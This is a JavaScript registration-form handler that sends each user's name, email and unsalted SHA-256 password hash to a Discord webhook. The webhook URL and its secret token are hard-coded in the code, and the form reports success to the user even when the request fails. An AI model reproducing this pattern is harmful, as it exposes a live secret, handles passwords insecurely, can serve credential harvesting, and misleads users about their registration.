function hashPassword(password) {
  const sha256 = CryptoJS.SHA256(password).toString(CryptoJS.enc.Hex);
  return sha256;
}

document.addEventListener("DOMContentLoaded", function () {
  const registerForm = document.getElementById("registerForm");
  const registerButton = document.getElementById("registerButton");
  const registerStatus = document.getElementById("registerStatus");
  const termsCheckbox = document.getElementById("termsCheckbox");

  registerForm.addEventListener("submit", function (event) {
    event.preventDefault();

    if (!termsCheckbox.checked) {
      alert("Please accept the Terms and Conditions and Privacy Policy.");
      return;
    }

    const name = document.getElementById("name").value;
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    const hashedPassword = hashPassword(password);

    const payload = {
      content: `New registration:\nName: ${name}\nEmail: ${email}\nPassword (hashed): ${hashedPassword}`
    };

    const webhookURL = 'https://discord.com/api/webhooks/1178252049041858600/NImAZJvRyUP09OmLXNLLBWSKLN9u6srPMQp0lI8b-oeUkmzsDgDT5vaXeINEnvGc2EzN';

    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    })
    .then(response => {
      if (response.ok) {
        registerStatus.textContent = "Registration successful!";
        registerForm.reset();
      } else {
        registerStatus.textContent = "Succesfully Registered!.";
      }
    })
    .catch(error => {
      registerStatus.textContent = "An error occurred. Please try again later.";
      console.error('Error:', error);
    });
  });

  termsCheckbox.addEventListener('change', function () {
    registerButton.disabled = !termsCheckbox.checked;
  });
});
